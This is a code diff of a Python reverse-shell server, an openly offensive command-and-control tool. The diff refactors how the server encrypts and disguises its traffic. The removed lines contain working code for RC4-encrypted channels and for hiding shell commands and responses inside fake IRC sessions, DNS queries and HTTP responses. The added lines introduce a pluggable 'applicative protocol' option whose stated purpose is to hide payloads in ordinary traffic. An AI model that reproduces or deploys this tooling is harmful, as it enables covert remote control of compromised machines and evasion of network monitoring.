@@ -47,9 +47,7 @@ __copyright__ = copyright
 
 __all__ = [
     "ReverseShell",
-    "IrcReverseShell",
-    "DnsReverseShell",
-    "HttpReverseShell",
+    "ApplicationProtocols",
     "ReverseShellUdp",
     "ReverseShellTcp",
     "ReverseShellSocketTcp",
@@ -65,7 +63,6 @@ from functools import partial
 from re import compile as regex
 from contextlib import suppress
 from urllib.parse import urlparse
-from random import randint, choices
 from collections.abc import Callable
 from json import JSONDecodeError, loads
 from platform import system as platform
@@ -94,6 +91,14 @@ from base64 import (
 
 from PythonToolsKit.Encodings import decode_data
 from PythonToolsKit.PrintF import printf
+
+from protocols import protocols as implemented_protocols
+from protocols.base import ApplicationBaseClass
+import protocols
+
+from encryption.rc4 import encrypt, decrypt, initialization as rc4_init
+
+from tcp.utils import receiveall, sendall
 
 Json = TypeVar("Json", dict, list, str, int, float, bool)
 alphanum: bytes = ascii_letters.encode() + b"_" + digits.encode()
@@ -138,26 +143,36 @@ def is_filepath(filename: str, is_windows: bool = None) -> Union[bool, None]:
     return True
 
 
-def confirm(message: str) -> bool:
+def confirm(
+    message: str,
+    responses: Tuple[str] = ("y", "n", "yes", "no"),
+    positives: Tuple[str] = ("y", "yes"),
+) -> bool:
     """
     This function asks to continue.
     """
 
+    positives = tuple(x.casefold() for x in positives)
+    responses = tuple(x.casefold() for x in responses)
+    responses_string = (
+        "/".join(responses) + "/" + "/".join(x.upper() for x in responses)
+    )
+
     printf(
-        message + " [Y/N/y/n/yes/no/YES/NO] : ",
+        message + " [" + responses_string + "] : ",
         state="ASK",
         end="",
     )
     response = input().casefold()
-    while response not in ("y", "n", "yes", "no"):
+    while response not in responses:
         printf(
-            message + " [Y/N/y/n/yes/no/YES/NO] : ",
+            message + " [" + responses_string + "] : ",
             state="ASK",
             end="",
         )
         response = input().casefold()
 
-    if response in ("y", "yes"):
+    if response in positives:
         return True
     return False
 
@@ -193,29 +208,9 @@ class ReverseShell(Cmd, BaseRequestHandler):
         encoding: str = None,
     ):
         self.encoding = encoding or self.encoding
-        self.key = getattr(self, "key", None) or key and self.init_key(key)
+        self.key = getattr(self, "key", None) or key and rc4_init(key)
         Cmd.__init__(self)
-        BaseRequestHandler.__init__(self, *args)
-
-    def recv(self) -> bytes:
-        """
-        This method gets all packets sent.
-        """
-
-        data = self.sock.recv(65535)
-        if self.use_timeout:
-            self.sock.settimeout(0.5)
-        else:
-            self.sock.setblocking(False)
-
-        while True:
-            try:
-                data += self.sock.recv(65535)
-            except (BlockingIOError, SSLWantReadError, TimeoutError):
-                break
-
-        self.sock.setblocking(True)
-        return data
+        BaseRequestHandler.__init__(*args)
 
     def handle(self) -> None:
         """
@@ -230,8 +225,8 @@ class ReverseShell(Cmd, BaseRequestHandler):
             self.sender = lambda x: sock.sendto(x, self.client_address)
         else:
             sock = self.sock = request
-            data = self.recv()
-            self.sender = self.request.sendall
+            data = receiveall(sock, self.use_timeout)
+            self.sender = partial(sendall, sock, timeout=self.use_timeout) # self.request.sendall
 
         data = self.parse_data(data)
 
@@ -345,7 +340,7 @@ class ReverseShell(Cmd, BaseRequestHandler):
         """
 
         if self.key:
-            data = self.encrypt(data, decrypt=True)
+            data = decrypt(self.key, data, decrypt=True)
 
         if data[0] == 1:
             try:
@@ -461,7 +456,7 @@ class ReverseShell(Cmd, BaseRequestHandler):
                 return None
 
         if self.key:
-            data = self.encrypt(argument.encode(self.encoding))
+            data = encrypt(self.key, argument.encode(self.encoding))
         else:
             data = argument.encode(self.encoding)
 
@@ -515,35 +510,6 @@ class ReverseShell(Cmd, BaseRequestHandler):
         This method quits the reverse shell.
         """
 
-        # arguments = shellsplit(argument)
-        # if len(arguments) > 1:
-        #     command = shelljoin(["cd", argument])
-        #     command_repr = repr(command)
-        #     printf(
-        #         "Invalid command detected for 'cd' command.",
-        #         state="ERROR",
-        #         file=stderr,
-        #     )
-        #     printf("Do you want to send: " + command_repr + " ?", state="ASK")
-        #     response = ""
-        #     while response.casefold() not in ("yes", "y", "n", "no"):
-        #         response = input(
-        #             "[YES/yes/y/Y]: to send the new command ("
-        #             + command_repr
-        #             + "), [NO/no/n/N]: don't send the command: "
-        #         )
-        #     if response in ("yes", "y"):
-        #         self.default(command)
-        #     else:
-        #         self.cmdloop()
-        # elif len(arguments) < 1:
-        #     printf(
-        #         "Invalid command detected for 'cd' command."
-        #         " First argument is required.",
-        #         state="ERROR",
-        #         file=stderr,
-        #     )
-        #     self.cmdloop()
         if not len(argument):
             printf(
                 "Invalid command detected for 'cd' command."
@@ -1132,281 +1098,33 @@ class ReverseShell(Cmd, BaseRequestHandler):
 
         return True
 
-    def init_key(self, key_text: bytes) -> bytes:
-        """
-        This method sets RC4 key.
-        """
 
-        key = self.key = bytearray(range(256))
-        j = 0
-
-        for i in range(256):
-            j = (j + key[i] + key_text[i % len(key_text)]) % 256
-            key[i], key[j] = key[j], key[i]
-
-        return key
-
-    def encrypt(self, data: bytes, decrypt: bool = False) -> bytes:
-        """
-        This method encrypts/decrypts data with RC4.
-        """
-
-        if decrypt:
-            iv = data[:256]
-            data = data[256:]
-        else:
-            iv = urandom(256)
-
-        i = j = 0
-        encrypted = bytearray()
-        key = [iv[i] ^ char for i, char in enumerate(self.key)]
-
-        for char in data:
-            i = (i + 1) % 256
-            j = (j + key[i]) % 256
-            key[i], key[j] = key[j], key[i]
-            encrypted.append(char ^ key[(key[i] + key[j]) % 256])
-
-        if decrypt:
-            return bytes(encrypted)
-        return iv + bytes(encrypted)
-
-
-class IrcReverseShell(ReverseShell):
+class ApplicationProtocols(ReverseShell):
 
     """
-    This class implements a fake IRC server for a reverse shell.
+    This class wraps respones and parses requests
+    for an application protocol.
     """
 
-    @staticmethod
-    def random_message() -> bytes:
-        """
-        This method generates a random message.
-        """
-
-        msg = b""
-        for a in range(randint(2, 8)):
-            msg += bytes(choices(letters, k=randint(1, 10))) + b" "
-        return msg[:-1]
-
-    def parse_data_step0(self, data: bytes) -> str:
-        """
-        This method parses the USER IRC command (first packet
-        for IRC initialization).
-        """
-
-        def random_domain() -> bytes:
-            return (
-                b"*"  # wildcard syntax for subdomain
-                + b"."
-                + bytes(choices(alphanum, k=randint(1, 10)))
-                + b"."
-                + bytes(choices(letters, k=randint(1, 10)))
+    def __init__(
+        self,
+        *args,
+        application_protocol: ApplicationBaseClass = None,
+        **kwargs,
+    ):
+        if not isinstance(application_protocol, ApplicationBaseClass):
+            raise TypeError(
+                "application_class arguments must be a ApplicationBaseClass's instance"
             )
-
-        if len(data) > 5 and data.startswith(b"USER "):
-            splitted_data = data.split(maxsplit=4)
-            if len(splitted_data) == 5:
-                (
-                    _,
-                    self.user,
-                    self.hostname,
-                    self.servername,
-                    self.description,
-                ) = splitted_data
-                self.user = self.user.decode()
-                self.hostname = self.hostname.decode()
-                self.description = self.description.strip().decode()
-                ReverseShell.prompt = (
-                    f"{self.hostname}@{self.user}{self.description}$ "
-                )
-                self.random_domain = random_domain()
-                self.__class__.parse_data = self.parse_data_step1
-                self.sender(
-                    b":"
-                    + self.random_domain
-                    + b" NOTICE * :"
-                    + self.random_message()
-                    + b"\r\n"
-                )
-
-        return ""
-
-    def parse_data_step1(self, data: bytes) -> str:
-        """
-        This method parses the NICK IRC command (second packet
-        for IRC initialization).
-        """
-
-        if len(data) > 5 and data.startswith(b"NICK "):
-            self.nickname = data[5:].strip()
-            self.__class__.parse_data = self.parse_data_step2
-            self.sender(
-                b":"
-                + self.random_domain
-                + b" NOTICE * :"
-                + self.random_message()
-                + b"\r\n"
-            )
-            return ""
-
-        self.__class__.parse_data = self.parse_data_step0
-        return ""
-
-    def parse_data_step2(self, data: bytes) -> str:
-        """
-        This method parses the JOIN IRC command (third packet
-        for IRC initialization).
-        """
-
-        if len(data) > 6 and data.startswith(b"JOIN #"):
-            channels = data[5:].strip()
-            self.__class__.channels = channels.split(b",")
-            self.sender(b":" + self.nickname + b" JOIN :" + channels + b"\r\n")
-            self.ping = bytes(choices(alphanum, k=randint(1, 10)))
-            self.__class__.parse_data = self.parse_data_step3
-            self.sender(b"PING :" + self.ping + b"\r\n")
-            return ""
-
-        self.__class__.parse_data = self.parse_data_step0
-        return ""
-
-    def parse_data_step3(self, data: bytes) -> str:
-        """
-        This method parses the JOIN IRC command (third packet
-        for IRC initialization).
-        """
-
-        if data.startswith(b"PONG :"):
-            if self.ping == data[6:].strip():
-                self.__class__.parse_data = self.parse_data_step4
-                self.sender(
-                    b":"
-                    + self.random_domain
-                    + b" NOTICE "
-                    + self.nickname
-                    + b" :"
-                    + self.random_message()
-                    + b"\r\n"
-                )
-                return ""
-
-        self.__class__.parse_data = self.parse_data_step0
-        return ""
-
-    def parse_data_step4(self, data: bytes) -> str:
-        """
-        This method parses the PRIVMSG IRC packets used for reverse shell.
-        """
-
-        if len(data) > 9 and data.startswith(b"PRIVMSG #"):
-            splitted_data = data.split()
-            if len(splitted_data) == 3 and splitted_data[1] in self.channels:
-                return super().parse_data(b64decode(splitted_data[2][1:]))
-
-        self.__class__.parse_data = self.parse_data_step0
-        return ""
-
-    def default(self, data: str, *args, **kwargs) -> None:
-        """
-        This method generates IRC response.
-        """
-
-        if self.default_sender:
-            self.username = getattr(self, "username", None) or bytes(
-                choices(alphanum, k=randint(4, 10))
-            )
-
-            sender = self.sender
-            self.sender = lambda x: sender(
-                b":"
-                + self.username
-                + b" PRIVMSG "
-                + self.channels[0]
-                + b" :"
-                + b64encode(x)
-                + b"\r\n"
-            )
-            self.default_sender = False
-
-        super().default(data, *args, **kwargs)
-
-    parse_data = parse_data_step0
-
-
-class DnsReverseShell(ReverseShell):
-
-    """
-    This class implements a reverse shell using DNS (UDP).
-    """
+        self.app = application_protocol
+        super().__init__(self, *args, **kwargs)
 
     def parse_data(self, data: bytes) -> str:
         """
-        This method parses DNS requests.
+        This method parses application protocoles requests.
         """
 
-        self.dns_id = data[:2]
-        query = data[12:].split(b"\x00")[0]
-        data = bytearray()
-
-        while query:
-            length = query[0] + 1
-            data += b16decode(query[1:length])
-            query = query[length:]
-
-        return super().parse_data(data)
-
-    def default(self, data: str, *args, **kwargs) -> None:
-        """
-        This method generates HTTP response.
-        """
-
-        def generate_query(data: bytes) -> bytes:
-            first = data[:5]
-            query = bytearray()
-            query.append(len(first) * 2)
-            query += b16encode(first)
-            data = data[5:]
-            while len(data) > 50:
-                length = randint(10, 50)
-                query += (length * 2).to_bytes(1) + b16encode(data[:length])
-                data = data[length:]
-            if data:
-                query += (len(data) * 2).to_bytes(
-                    1, byteorder="big"
-                ) + b16encode(data)
-            query += (
-                b"\x00\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01"
-                + randint(0, 2147483647).to_bytes(4, "big")
-                + b"\x00\x04"
-                + randint(0, 2147483647).to_bytes(4, "big")
-            )
-            return query
-
-        if self.default_sender:
-            sender = self.sender
-            self.sender = lambda x: sender(
-                self.dns_id
-                + b"\x80\x00\x00\x01\x00\x01\x00\x00\x00\x00"
-                + generate_query(x)
-            )
-            self.default_sender = False
-
-        super().default(data, *args, **kwargs)
-
-
-class HttpReverseShell(ReverseShell):
-
-    """
-    This class implements a reverse shell using HTTP.
-    """
-
-    def parse_data(self, data: bytes) -> str:
-        """
-        This method parses HTTP requests.
-        """
-
-        return super().parse_data(data.split(b"\r\n\r\n", 1)[1])
+        return super().parse_data(self.app.parse_request(data))
 
     def default(self, data: str, *args, **kwargs) -> None:
         """
@@ -1415,18 +1133,7 @@ class HttpReverseShell(ReverseShell):
 
         if self.default_sender:
             sender = self.sender
-            self.sender = lambda x: sender(
-                b"HTTP/1.0 200 OK\r\nContent-Type: {type}\r\n".replace(
-                    b"{type}",
-                    b"octect/stream"
-                    if self.key
-                    else b"text/plain; charset=utf-8",
-                )
-                + b"Content-Length: {length}\r\n\r\n".replace(
-                    b"{length}", str(len(x)).encode()
-                )
-                + x
-            )
+            self.sender = lambda x: sender(self.app.wrap_response(x))
             self.default_sender = False
 
         super().default(data, *args, **kwargs)
@@ -1553,25 +1260,15 @@ def parser() -> Namespace:
         action="store_true",
         help="Create TCP socket for each command and responses.",
     )
-    protocol = arguments.add_mutually_exclusive_group()
-    protocol_add_argument = protocol.add_argument
-    protocol_add_argument(
-        "--http",
-        "-H",
-        action="store_true",
-        help="Use HTTP requests and responses.",
-    )
-    protocol_add_argument(
-        "--dns",
-        "-d",
-        action="store_true",
-        help="Use DNS requests and responses.",
-    )
-    protocol_add_argument(
-        "--irc",
-        "-I",
-        action="store_true",
-        help="Use IRC requests and response.",
+    arguments_add_argument(
+        "--applicative-protocol",
+        "--protocol",
+        "-a",
+        help=(
+            "Applicative protocol to hide ReverseShell"
+            " payloads and responses in applicative traffic."
+        ),
+        choices=implemented_protocols,
     )
     arguments_add_argument(
         "--no-color",
@@ -1663,25 +1360,23 @@ def main() -> int:
         )
         protocol = "tcp-onesocket"
 
-    if arguments.http:
+    if arguments.applicative_protocol:
         handler: Callable = partial(
-            HttpReverseShell, key=arguments.key, encoding=arguments.encoding
+            ApplicationProtocols,
+            application_protocol=getattr(
+                protocols, arguments.applicative_protocol
+            )(),
+            key=arguments.key,
+            encoding=arguments.encoding,
         )
-        protocol += " http"
-    elif arguments.irc:
-        handler: Callable = partial(
-            IrcReverseShell, key=arguments.key, encoding=arguments.encoding
-        )
-        protocol += " irc"
-    elif arguments.dns:
-        handler: Callable = partial(
-            DnsReverseShell, key=arguments.key, encoding=arguments.encoding
-        )
-        protocol += " dns"
+        protocol += " " + arguments.applicative_protocol
     else:
         handler: Callable = partial(
             ReverseShell, key=arguments.key, encoding=arguments.encoding
         )
+
+    if arguments.ssl:
+        protocol += " tls"
 
     with class_(handler=handler) as shellserver:
         print(
